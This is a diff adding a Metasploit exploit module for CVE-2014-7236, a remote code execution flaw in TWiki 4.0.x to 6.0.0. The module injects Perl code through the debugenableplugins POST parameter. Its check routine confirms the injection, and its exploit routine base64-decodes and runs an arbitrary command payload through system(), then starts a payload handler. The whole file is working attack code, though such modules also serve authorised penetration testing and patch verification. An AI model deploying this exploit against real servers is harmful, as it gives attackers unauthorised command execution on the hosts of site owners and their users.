@@ -1,0 +1,101 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'TWiki Debugenableplugins Remote Code Execution',
+      'Description' => %q{
+        TWiki 4.0.x-6.0.0  contains a vulnerability in the Debug functionality.
+        The value of the debugenableplugins parameter is used without proper sanitization
+        in an Perl eval statement which allows remote code execution
+      },
+      'Author' =>
+        [
+          'Netanel Rubin', # from Check Point - Discovery
+          'h0ng10', # Metasploit Module
+
+        ],
+      'License' => MSF_LICENSE,
+      'References' =>
+        [
+          [ 'CVE', '2014-7236'],
+          [ 'OSVDB', '112977'],
+          [ 'URL', 'http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2014-7236']
+        ],
+      'Privileged' => false,
+      'Targets' =>
+        [
+          [ 'Automatic',
+            {
+              'Payload'        =>
+                {
+                  'BadChars' => "",
+                  'Compat'      =>
+                    {
+                      'PayloadType' => 'cmd',
+                      'RequiredCmd' => 'generic perl python php',
+                    }
+                },
+              'Platform' => ['unix'],
+              'Arch' => ARCH_CMD
+            }
+          ]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Oct 09 2014'))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [ true, "TWiki path", '/do/view/Main/WebHome' ]),
+        OptString.new('PLUGIN', [true, "A existing TWiki Plugin", 'BackupRestorePlugin'])
+      ], self.class)
+  end
+
+
+  def send_code(perl_code)
+    uri = target_uri.path
+    data = "debugenableplugins=#{datastore['PLUGIN']}%3b" + CGI.escape(perl_code) + "%3bexit"
+
+    res = send_request_cgi!({
+      'method' => 'POST',
+      'uri' => uri,
+      'data' => data
+    })
+
+    return res
+  end
+
+
+  def check
+    rand_1 = rand_text_alpha(5)
+    rand_2 = rand_text_alpha(5)
+
+    code = "print(\"Content-Type:text/html\\r\\n\\r\\n#{rand_1}\".\"#{rand_2}\")"
+    res = send_code(code)
+
+    if res and res.code == 200
+      return CheckCode::Vulnerable if res.body == rand_1 + rand_2
+    end
+    CheckCode::Unknown
+  end
+
+
+  def exploit
+    code = "print(\"Content-Type:text/html\\r\\n\\r\\n\");"
+    code += "require('MIME/Base64.pm');MIME::Base64->import();"
+    code += "system(decode_base64('#{Rex::Text.encode_base64(payload.encoded)}'));exit"
+    res = send_code(code)
+    handler
+
+  end
+
+end
